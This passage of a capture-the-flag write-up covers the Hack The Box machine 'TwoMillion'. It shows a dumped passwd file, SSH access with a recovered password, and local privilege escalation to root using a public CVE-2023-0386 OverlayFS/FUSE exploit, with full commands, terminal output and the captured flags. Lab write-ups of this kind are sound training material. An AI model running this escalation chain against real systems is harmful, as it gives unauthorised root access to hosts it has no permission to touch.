sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000::/home/admin:/bin/bash
memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
```

We now have a DB username and password as well as an potential user '_laurel' as such let us try and access the server via SSH:

```
└─$ ssh admin@2million.htb                                                 
The authenticity of host '2million.htb (10.129.71.55)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '2million.htb' (ED25519) to the list of known hosts.
admin@2million.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Aug 24 02:55:24 PM UTC 2026

  System load:           0.080078125
  Usage of /:            73.1% of 4.82GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             219
  Users logged in:       0
  IPv4 address for eth0: 10.129.71.55
  IPv6 address for eth0: dead:beef::a0de:adff:fe8a:6f8a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ pwd
/home/admin
admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt 
dfa8197390fd3c20d6e06fa4aa74a877
```

User.txt has been solved.

Now we move onwards, though as we are an admin user this is trivial:

```
admin@2million:~$ cat /root/root.txt
cat: /root/root.txt: Permission denied
```

Now that is cheeky.

#### PrivEsc

It would appear that admin an an 'user' account as we need to elevate our privelages to gain that root flag, so lets poke around:

```
admin@2million:~$ sudo -l
[sudo] password for admin: 
Sorry, user admin may not run sudo on localhost.
```

Moving along

```
admin@2million:~$ cd ..
admin@2million:/home$ ls
admin
admin@2million:/home$ cd ..
admin@2million:/$ ls
bin   dev  home  lib32  libx32  media  opt   root  sbin  srv  tmp  var
boot  etc  lib   lib64  lost+found  mnt  proc  run   snap  sys  usr
admin@2million:/$ cd var/
admin@2million:/var$ ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
admin@2million:/var$ cd mail/
admin@2million:/var/mail$ ls
admin
admin@2million:/var/mail$ cat admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Interesting, through enumeration we found a mail directory and an message contained within.

It seems Ch4p is warning admin to update as there is a kernel explioit knocking around for OverlayFS / FUSE being mentioned...

A quick search later and we have a CVE, CVE-2023-0386:

![9](/imgs/posts/TwoMillion/9.png){: .align-center }

Seems to effect certain kernal versions, so we can check our target machine if it is susceptible:

```
admin@2million:/var/mail$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

Bingo.

#### Root Flag

Now we have a CVE we can use to exploit we need to get a copy downloaded to our machine and then upload it to the target:

```
└─$ git clone https://github.com/xkaneiki/CVE-2023-0386
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0 (from 0)
Receiving objects: 100% (24/24), 426.11 KiB | 7.35 MiB/s, done.
Resolving deltas: 100% (7/7), done.
```

And compress it down:

```
└─$ zip -r cve.zip CVE-2023-0386
  adding: CVE-2023-0386/ (stored 0%)
  adding: CVE-2023-0386/README.md (deflated 23%)
  adding: CVE-2023-0386/getshell.c (deflated 58%)
  adding: CVE-2023-0386/Makefile (deflated 20%)
  adding: CVE-2023-0386/ovlcap/ (stored 0%)
  adding: CVE-2023-0386/ovlcap/.gitkeep (stored 0%)
  adding: CVE-2023-0386/.git/ (stored 0%)
  adding: CVE-2023-0386/.git/objects/ (stored 0%)
  adding: CVE-2023-0386/.git/objects/info/ (stored 0%)
  adding: CVE-2023-0386/.git/objects/pack/ (stored 0%)
  adding: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.rev (deflated 27%)
  adding: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.idx (deflated 54%)
  adding: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.pack (deflated 0%)
  adding: CVE-2023-0386/.git/refs/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/heads/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/heads/main (stored 0%)
  adding: CVE-2023-0386/.git/refs/remotes/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/remotes/origin/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/remotes/origin/HEAD (stored 0%)
  adding: CVE-2023-0386/.git/refs/tags/ (stored 0%)
  adding: CVE-2023-0386/.git/info/ (stored 0%)
  adding: CVE-2023-0386/.git/info/exclude (deflated 28%)
  adding: CVE-2023-0386/.git/hooks/ (stored 0%)
  adding: CVE-2023-0386/.git/hooks/update.sample (deflated 68%)
  adding: CVE-2023-0386/.git/hooks/sendemail-validate.sample (deflated 58%)
  adding: CVE-2023-0386/.git/hooks/pre-applypatch.sample (deflated 38%)
  adding: CVE-2023-0386/.git/hooks/fsmonitor-watchman.sample (deflated 62%)
  adding: CVE-2023-0386/.git/hooks/pre-rebase.sample (deflated 59%)
  adding: CVE-2023-0386/.git/hooks/prepare-commit-msg.sample (deflated 50%)
  adding: CVE-2023-0386/.git/hooks/pre-push.sample (deflated 49%)
  adding: CVE-2023-0386/.git/hooks/commit-msg.sample (deflated 44%)
  adding: CVE-2023-0386/.git/hooks/pre-receive.sample (deflated 40%)
  adding: CVE-2023-0386/.git/hooks/post-update.sample (deflated 27%)
  adding: CVE-2023-0386/.git/hooks/push-to-checkout.sample (deflated 55%)
  adding: CVE-2023-0386/.git/hooks/applypatch-msg.sample (deflated 42%)
  adding: CVE-2023-0386/.git/hooks/pre-commit.sample (deflated 45%)
  adding: CVE-2023-0386/.git/hooks/pre-merge-commit.sample (deflated 39%)
  adding: CVE-2023-0386/.git/config (deflated 30%)
  adding: CVE-2023-0386/.git/HEAD (stored 0%)
  adding: CVE-2023-0386/.git/index (deflated 37%)
  adding: CVE-2023-0386/.git/logs/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/heads/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/heads/main (deflated 26%)
  adding: CVE-2023-0386/.git/logs/refs/remotes/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/remotes/origin/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/remotes/origin/HEAD (deflated 26%)
  adding: CVE-2023-0386/.git/logs/HEAD (deflated 26%)
  adding: CVE-2023-0386/.git/packed-refs (deflated 12%)
  adding: CVE-2023-0386/.git/description (deflated 14%)
  adding: CVE-2023-0386/fuse.c (deflated 68%)
  adding: CVE-2023-0386/test/ (stored 0%)
  adding: CVE-2023-0386/test/fuse_test.c (deflated 74%)
  adding: CVE-2023-0386/test/mnt.c (deflated 62%)
  adding: CVE-2023-0386/test/mnt (deflated 82%)
  adding: CVE-2023-0386/exp.c (deflated 64%)
```

Ok we have cve.zip on our machine, lets get it over to the target.

```
└─$ scp cve.zip admin@2million.htb:/tmp
admin@2million.htb's password: 
cve.zip                    100%  460KB 702.5KB/s   00:00
```

Now to unzip:

```
admin@2million:/var/mail$ cd /tmp
admin@2million:/tmp$ unzip cve.zip 
Archive:  cve.zip
   creating: CVE-2023-0386/
  inflating: CVE-2023-0386/README.md  
  inflating: CVE-2023-0386/getshell.c  
  inflating: CVE-2023-0386/Makefile  
   creating: CVE-2023-0386/ovlcap/
 extracting: CVE-2023-0386/ovlcap/.gitkeep  
   creating: CVE-2023-0386/.git/
   creating: CVE-2023-0386/.git/objects/
   creating: CVE-2023-0386/.git/objects/info/
   creating: CVE-2023-0386/.git/objects/pack/
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.rev  
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.idx  
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.pack  
   creating: CVE-2023-0386/.git/refs/
   creating: CVE-2023-0386/.git/refs/heads/
 extracting: CVE-2023-0386/.git/refs/heads/main  
   creating: CVE-2023-0386/.git/refs/remotes/
   creating: CVE-2023-0386/.git/refs/remotes/origin/
 extracting: CVE-2023-0386/.git/refs/remotes/origin/HEAD  
   creating: CVE-2023-0386/.git/refs/tags/
   creating: CVE-2023-0386/.git/info/
  inflating: CVE-2023-0386/.git/info/exclude  
   creating: CVE-2023-0386/.git/hooks/
  inflating: CVE-2023-0386/.git/hooks/update.sample  
  inflating: CVE-2023-0386/.git/hooks/sendemail-validate.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-applypatch.sample  
  inflating: CVE-2023-0386/.git/hooks/fsmonitor-watchman.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-rebase.sample  
  inflating: CVE-2023-0386/.git/hooks/prepare-commit-msg.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-push.sample  
  inflating: CVE-2023-0386/.git/hooks/commit-msg.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-receive.sample  
  inflating: CVE-2023-0386/.git/hooks/post-update.sample  
  inflating: CVE-2023-0386/.git/hooks/push-to-checkout.sample  
  inflating: CVE-2023-0386/.git/hooks/applypatch-msg.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-commit.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-merge-commit.sample  
  inflating: CVE-2023-0386/.git/config  
 extracting: CVE-2023-0386/.git/HEAD  
  inflating: CVE-2023-0386/.git/index  
   creating: CVE-2023-0386/.git/logs/
   creating: CVE-2023-0386/.git/logs/refs/
   creating: CVE-2023-0386/.git/logs/refs/heads/
  inflating: CVE-2023-0386/.git/logs/refs/heads/main  
   creating: CVE-2023-0386/.git/logs/refs/remotes/
   creating: CVE-2023-0386/.git/logs/refs/remotes/origin/
  inflating: CVE-2023-0386/.git/logs/refs/remotes/origin/HEAD  
  inflating: CVE-2023-0386/.git/logs/HEAD  
  inflating: CVE-2023-0386/.git/packed-refs  
  inflating: CVE-2023-0386/.git/description  
  inflating: CVE-2023-0386/fuse.c    
   creating: CVE-2023-0386/test/
  inflating: CVE-2023-0386/test/fuse_test.c  
  inflating: CVE-2023-0386/test/mnt.c  
  inflating: CVE-2023-0386/test/mnt  
  inflating: CVE-2023-0386/exp.c     
admin@2million:/tmp$ ls
CVE-2023-0386
cve.zip
snap-private-tmp
systemd-private-b5e86d4a33c1466a8c1c6eb74873084d-memcached.service-LZt1dP
systemd-private-b5e86d4a33c1466a8c1c6eb74873084d-ModemManager.service-NVrnJ5
systemd-private-b5e86d4a33c1466a8c1c6eb74873084d-systemd-logind.service-ESLsA9
systemd-private-b5e86d4a33c1466a8c1c6eb74873084d-systemd-resolved.service-ZY5sCa
systemd-private-b5e86d4a33c1466a8c1c6eb74873084d-systemd-timesyncd.service-RPv6zi
vmware-root_610-2731152165
admin@2million:/tmp$ cd CVE-2023-0386/
admin@2million:/tmp/CVE-2023-0386$ ls
exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test
```

As its C code, we need to build it:

```
make all
```

Once made we can run the exploit:

```
admin@2million:/tmp/CVE-2023-0386$ ./exp 
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root root 4096 Aug 24 15:15 .
drwxrwxr-x 6 root root 4096 Aug 24 15:15 ..
[+] exploit success!
sh: 1: ./ovlcap/upper/file: Permission denied
```

Or not, seems this is a two part process per the readme...

```
./fuse ./ovlcap/lower ./gc &
```

Now we can try the exploit again:

```
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
[1] 2331
admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 Aug 24 15:16 .
drwxrwxr-x 6 root   root     4096 Aug 24 15:15 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# 
```

We are now logged as root, so simply:

```
root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
dd53a4c06a4155e3facad2c259059ae1
```

Root.txt has been solved. 

# Write Up

This was a good box to start getting me back into the swing of creating detailed write ups as well as what works and doesn't work for me when it comes to note taking.

I feel like I will spend some more time in the academy and going through some things.

An enjoyable experience for someone who has been doing a lot of networking over the last few months, it is horrific how much my skills atrophe when I don't do something for a while.

I feel dumb, but that is entirely the point, you start over and get back on the horse.

![10](/imgs/posts/TwoMillion/10.png){: .align-center }


#### Tooling Used
* Terminal
* Open VPN
* A Search Engine
